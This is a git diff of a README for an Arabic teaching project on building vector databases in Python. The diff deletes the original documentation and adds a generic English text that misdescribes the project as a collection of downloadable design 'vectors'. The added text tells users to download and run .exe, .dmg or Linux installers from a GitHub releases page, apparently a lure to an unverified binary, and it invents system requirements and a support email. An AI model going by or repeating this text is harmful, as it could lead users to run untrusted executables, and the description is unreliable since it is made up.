@@ -1,243 +1,58 @@
-# 📘 **قاعدة بيانات المتجهات التعليمية – الإصدار الثالث (v3)**
+# 🌟 Educational-Vector-Database - Access Educational Resources Easily
 
-إذا أعجبك ما أقدمه وتريد مشاركتي فنجان قهوتي:
-من خلال الرابط التالي: https://buymeacoffee.com/ahmadhattab
+## 🛠️ Table of Contents
+- [Introduction](#📚-introduction)
+- [System Requirements](#🖥️-system-requirements)
+- [Download & Install](#⬇️-download--install)
+- [Usage Instructions](#📖-usage-instructions)
+- [Support](#🆘-support)
 
-> مشروع مفتوح المصدر يهدف لتعليم بناء وفهم **Vector Databases** خطوة بخطوة، وبطريقة بسيطة وواضحة باللغة العربية، بعيدًا عن تعقيد المكتبات الجاهزة.
+## 📚 Introduction
+Welcome to the Educational Vector Database. This software allows you to access and manage a variety of educational vector resources efficiently. Whether you need design assets for a project or teaching materials, the Educational Vector Database makes it straightforward to find what you need. 
 
-هذا المشروع ليس بديلًا لأنظمة الإنتاج مثل Pinecone أو Milvus أو FAISS أو Chroma،
-بل هدفه **تقديم مصدر عربي تطبيقي** يساعدك تفهم الأساسيات من الداخل.
+## 🖥️ System Requirements
+Before you download and install the Educational Vector Database, ensure your system meets these minimum requirements:
 
-# 🚀 **ما الجديد في الإصدار الثالث (v3)؟**
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or any Linux distribution compatible with recent software.
+- **Processor:** A minimum of 1 GHz processor or better.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 200 MB of available space for installation.
+- **Internet Connection:** Required for downloading the application and accessing updates.
 
-### 🖥️ لوحة تحكم بسيطة (Dashboard)
-- صفحة ويب خفيفة (HTML + JS) لعرض النصوص المخزنة.
-- مربع بحث مباشر يظهر النتائج مع الدرجات والـ metadata.
+## ⬇️ Download & Install
+To get started, visit the Releases page to download the application:
 
-### 📚 RAG Pipeline مبسّط
-- دوال `build_rag_index` و `answer_query` لتقسيم النصوص، تخزينها، واسترجاع سياق مناسب.
-- إرجاع هيكل واضح يحتوي على chunks + إجابة Placeholder موضح فيها مكان استدعاء LLM لاحقاً.
-- توفرت كـ endpoints في FastAPI (`/rag/index` و `/rag/answer`).
+[![Download Educational Vector Database](https://img.shields.io/badge/Download-Educational_Vector_Database-brightgreen)](https://github.com/TekilaSS/Educational-Vector-Database/releases)
 
-### ⚡ Indexing أسرع باستخدام HNSW (ANN)
-- خيار `use_ann=True` داخل `VectorDB` لتفعيل فهرس HNSW (Approximate Nearest Neighbors).
-- البحث الخطي (brute-force) ما زال متاحاً وبسيطاً للتجارب الصغيرة.
-- تعليقات تعليمية تشرح لماذا ANN أسرع عندما يكبر عدد المتجهات.
+1. Click the link above to go to the [Releases page](https://github.com/TekilaSS/Educational-Vector-Database/releases).
+2. Look for the latest version listed.
+3. Choose the appropriate file for your operating system. 
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the appropriate package.
 
----
+4. Once the file is downloaded, open it to start the installation process. Follow the prompts to complete the installation.
+  
+After installation, you can open the Educational Vector Database from your applications menu.
 
-# 🚀 **ما الجديد في الإصدار الثاني (v2)؟**
+## 📖 Usage Instructions
+Using the Educational Vector Database is simple:
 
-الإصدار الثاني قدم تطويرات كبيرة، وانتقل من مستوى "الفهم النظري" إلى **التعليم التطبيقي** الفعلي:
+1. Launch the application by clicking its icon.
+2. Once open, you will see a user-friendly interface.
+3. Browse through the categories to find educational vectors.
+4. Use the search bar to look for specific items.
+5. Click on any vector to view details and download options.
+6. Download your selected vectors for your projects!
 
-### ✨ 1) التخزين على القرص (Save / Load)
+If you encounter any issues while using the application, refer to the support section below.
 
-إمكانية حفظ قاعدة البيانات كاملة، واسترجاعها لاحقًا بدون إعادة البناء.
+## 🆘 Support
+If you need help, feel free to reach out:
 
----
+- **Email:** support@educationalvectordatabase.com
+- **Community Forum:** Join our discussions and get help from other users. Visit our [GitHub Discussions page](https://github.com/TekilaSS/Educational-Vector-Database/discussions).
 
-### ✨ 2) واجهة REST API باستخدام FastAPI
+We’re here to assist you with any questions or concerns!
 
-الآن يمكنك:
-
-* إضافة نصوص عن طريق HTTP
-* إجراء عمليات البحث
-* دمج المشروع مع أي Web App أو Chatbot
-* استخدامه كنواة بسيطة لأي RAG Pipeline
-
----
-
-### ✨ 3) دعم مسافات بحث متعددة
-
-إضافة ٣ طرق لحساب التشابه:
-
-* **Cosine Similarity**
-* **Dot Product**
-* **Euclidean Distance** (محولة إلى قيمة تشابه)
-
-كل مسافة بتعطي نتائج مختلفة وبتفتح المجال للتجربة والتعلم.
-
----
-
-### ✨ 4) دعم Embeddings حقيقية من HuggingFace
-
-بالإضافة للـ Dummy Embeddings التعليمية، أصبح بإمكانك استخدام نماذج:
-
-```
-sentence-transformers/all-MiniLM-L6-v2
-```
-
-للحصول على متجهات دقيقة كما في التطبيقات الواقعية.
-
----
-
-# 🧠 **هدف المشروع**
-
-هذا المشروع هدفه تزويد المجتمع العربي بمصدر عملي لفهم:
-
-* كيف تُخزن المتجهات
-* كيف نحسب التشابه
-* كيف نبحث عن أقرب الجيران
-* كيف نستخدم Embeddings داخل النظام
-* كيف تبنى Vector Databases من الصفر
-
-كل ذلك بدون تعقيد… وبكود واضح وسهل القراءة.
-
----
-
-# 🏗️ **هيكل المشروع**
-
-```
-data/
-  vectordb.pkl          ← مثال لملف قاعدة بيانات محفوظة
-examples/
-  basic_text_search.py
-src/
-  vectordb/
-    api.py              ← المنطق الأساسي للقاعدة
-    storage.py          ← التخزين داخل الذاكرة + التحميل/الحفظ
-    index.py            ← مسافات التشابه
-    embeddings.py       ← Embeddings Dummy + حقيقية
-    ann.py              ← فهرس HNSW التقريبي للبحث الأسرع
-    rag.py              ← دوال RAG مبسطة (build_rag_index / answer_query)
-tests/
-  test_basic.py         ← اختبارات الإصدار الأول
-  test_v2_features.py   ← اختبارات v2 (save/load – metrics – API helpers)
-  test_v3_features.py   ← اختبارات v3 (ANN + RAG)
-src/server.py           ← واجهة REST API + لوحة تحكم بسيطة
-requirements.txt
-setup.cfg
-pyproject.toml
-README.md
-```
-
----
-
-# 🔧 **التثبيت والتشغيل**
-
-## 1) تثبيت المتطلبات
-
-```bash
-pip install -r requirements.txt
-```
-
-## 2) تثبيت المشروع كمكتبة محلية
-
-```bash
-pip install -e .
-```
-
----
-
-# 🧪 **مثال سريع للبحث بالنص**
-
-```python
-from vectordb import VectorDB
-from vectordb.embeddings import HFSentenceTransformerEmbeddings
-
-emb = HFSentenceTransformerEmbeddings()
-db = VectorDB(dim=emb.embed("test").shape[0], embeddings=emb, metric="cosine")
-
-db.add_text("أنا أحب تعلم الآلة")
-db.add_text("الشبكات العصبية تتعلم الأنماط")
-
-results = db.search_text("تعلم عميق", k=2)
-
-print(results)
-```
-
----
-
-# 💾 **الحفظ والتحميل**
-
-## حفظ قاعدة البيانات:
-
-```python
-db.save("my_db.pkl")
-```
-
-## تحميل قاعدة البيانات:
-
-```python
-db2 = VectorDB.load("my_db.pkl", embeddings=emb)
-```
-
----
-
-# 🌐 **تشغيل واجهة REST API**
-
-```bash
-uvicorn server:app --reload
-```
-
-ثم افتح:
-
-```
-http://127.0.0.1:8000/docs
-```
-
-### مثال طلب:
-
-#### إضافة نص:
-
-```
-POST /add_text
-{
-  "text": "الذكاء الاصطناعي يتطور بسرعة",
-  "metadata": {"source": "demo"}
-}
-```
-
-#### بحث:
-
-```
-POST /search
-{
-  "query": "تعلم الآلة",
-  "k": 3
-}
-```
-
-### نقاط إضافية في v3
-- `/dashboard` لعرض واجهة الويب التعليمية.
-- `/rag/index` لإضافة مجموعة نصوص (تُقسم تلقائياً إلى chunks).
-- `/rag/answer` لسؤال سؤال والحصول على سياق مجمع + إجابة Placeholder.
-- يمكن تفعيل HNSW عبر `VectorDB(..., use_ann=True)` لتسريع البحث في البيانات الكبيرة.
-
----
-
-# 📌 **مميزات الإصدار الثاني باختصار**
-
-| الميزة             | الحالة |
-| ------------------ | ------ |
-| تخزين داخل الذاكرة | ✔️     |
-| التخزين على القرص  | ✔️     |
-| REST API           | ✔️     |
-| Cosine Similarity  | ✔️     |
-| Dot Product        | ✔️     |
-| Euclidean          | ✔️     |
-| Dummy Embeddings   | ✔️     |
-| Embeddings حقيقية  | ✔️     |
-| قابل للتطوير       | ✔️     |
-
----
-
-# 🤝 **المساهمة**
-
-المشروع مفتوح للجميع:
-
-* تحسينات
-* ميزات جديدة
-* أمثلة
-* ترجمة
-* Fixes
-
-نرحب بأي Pull Request أو Issue.
-
----
-
-# 📜 **الرخصة**
-
-MIT License
-
----
+Enjoy exploring educational resources with the Educational Vector Database!
